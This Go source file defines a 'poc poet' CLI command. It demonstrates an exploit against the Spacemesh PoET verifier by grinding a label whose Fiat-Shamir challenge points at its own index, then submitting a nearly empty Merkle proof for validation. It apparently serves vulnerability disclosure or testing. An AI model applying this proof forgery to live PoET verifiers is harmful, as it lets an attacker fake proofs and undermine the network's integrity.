package cmd

import (
	"fmt"
	"sort"

	"github.com/spacemeshos/poet/hash"
	"github.com/spacemeshos/poet/shared"
	"github.com/spacemeshos/poet/verifier"
	"github.com/urfave/cli"
)

// PocCmd ...
var PocCmd = cli.Command{
	Name:  "poc",
	Usage: "poc actions",
	Subcommands: []cli.Command{
		pocPoetCmd,
	},
}

var pocPoetCmd = cli.Command{
	Name:   "poet",
	Usage:  "proof of concept for poet exploit",
	Flags:  []cli.Flag{},
	Action: pocPoet,
}

func asSortedSlice(s map[uint64]bool) []uint64 {
	var ret []uint64
	for key, value := range s {
		if value {
			ret = append(ret, key)
		}
	}
	sort.Slice(ret, func(i, j int) bool { return ret[i] < ret[j] })
	return ret
}

func pocPoet(ctx *cli.Context) (err error) {
	var membershipRoot []byte
	labelHashFunc := hash.GenLabelHashFunc(membershipRoot)
	merkleHashFunc := hash.GenMerkleHashFunc(membershipRoot)

	leafCount := uint64(1000)

	proof := shared.MerkleProof{}
	proof.Root, err = getRoot(leafCount, labelHashFunc)
	if err != nil {
		return
	}
	proof.ProvenLeaves = make([][]byte, shared.T)
	makeLabel := shared.MakeLabelFunc()
	provenLeafIndices := asSortedSlice(shared.FiatShamir(proof.Root, leafCount, shared.T))
	proof.ProvenLeaves[0] = makeLabel(labelHashFunc, provenLeafIndices[0], nil)

	err = verifier.Validate(proof, labelHashFunc, merkleHashFunc, leafCount, shared.T)
	return
}

func getRoot(leafCount uint64, labelHashFunc shared.LabelHash) (root []byte, err error) {
	makeLabel := shared.MakeLabelFunc()

	for i := uint64(0); i < leafCount; i++ {
		candidate := makeLabel(labelHashFunc, i, nil)
		provenLeafIndices := asSortedSlice(shared.FiatShamir(candidate, leafCount, shared.T))
		if provenLeafIndices[0] == i {
			fmt.Println("candidate index", i)
			root = candidate
			return
		}
	}

	err = fmt.Errorf("no candidate found")

	return
}
